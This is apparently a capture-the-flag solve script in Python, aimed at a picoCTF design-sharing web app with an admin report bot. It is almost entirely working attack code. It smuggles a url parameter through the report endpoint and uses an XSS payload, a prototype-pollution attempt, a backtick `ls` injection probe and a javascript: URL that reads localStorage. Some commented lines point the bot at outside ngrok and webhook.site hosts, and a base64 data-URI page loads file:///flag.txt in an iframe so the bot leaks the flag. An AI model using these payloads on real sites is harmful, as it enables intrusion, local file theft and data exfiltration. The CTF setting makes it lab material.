#!/usr/bin/env python3

import requests, sys, base64, urllib.parse as parse
from json import dumps as stringify
from time import sleep

HOST = 'http://0.0.0.0:8080'
# HOST = 'http://saturn.picoctf.net:51675'

def get_design(id: str):
    return requests.get(HOST + '/api/get', params={'id': id})

def get_reports():
    return requests.get(HOST + '/api/reports/get')

"""
Note that schema validates NAME while the share feature extracts TYPE.
"""
def create_design(payload: str):
    return requests.post(HOST + '/api/create', json=payload)

def report_raw(id):
    """
    Make bot open a design with given ID. No encoding applied
    """
    url = HOST + f'/report?id={id}'
    print(f'Reporting: {url}')
    return requests.get(url)

def report(url):
    """
    Make bot open given URL. URL is encoded.
    """
    return report_raw(f'anything;url={parse.quote(url)}')

"""
2 options:
1. Prepare a design which will display the flag once website is opened.
2. Prepare an id which will trigger RCE.
"""
# id='ngx.time()'
# # id='@https://webhook.site/0043b452-de19-44c5-9c08-155e5a9edadb'
# res=report(id)
# print(res.text)

# design = ([
#     {
#         "type": {
#             "toString": {
#                 "polluted": 1
#             }
#         },
#         "x": 0,
#         "y": 1,
#         "zIndex": 0
#     }
# ])
# design = ([
#     {
#         "type": "<script>alert(1)</script>",
#         "x": 0,
#         "y": 1,
#         "zIndex": 0
#     }
# ])

# for i in range(30):
#     design.append({
#         "type": "base",
#         "x": i * 30,
#         "y": 1,
#         "zIndex": 0
#     })

# print(design)

# res = create_design(design)
# print(res.text)

# payloads = [
#     "abcdefghij?id=http://google.com"
# ]

# design = get_design('42t7Tz3Cs7')
# print(design.text)

# report_raw('anything;url=http://5c65-83-21-51-245.ngrok.io')

# fetch fails
# report_raw('anything;url=file:///flag.txt')

# report_raw('anything;url=http://5c65-83-21-51-245.ngrok.io')
# report_raw('anything;url=http://7ff7-83-21-51-245.ngrok.io')
# report_raw('anything;url=javascript%3Adocument.body.innerHTML%3Dwindow.localStorage.get("flag")')
# report_raw('anything;url=http://openresty:8080/designer.js')
# report_raw('anything;url=`ls`')

if len(sys.argv) > 1:
    report(sys.argv[1])
    exit(0)

def report_data(payload: str):
    b64 = base64.b64encode(payload.encode('utf-8'))
    return report(f'data:text/html;base64,{b64.decode("utf-8")}')

payload = """
<iframe src="file:///flag.txt"></iframe>
<script>setTimeout(() => window.location = 'http://openresty:8080', 5100)</script>
"""
report_data(payload)

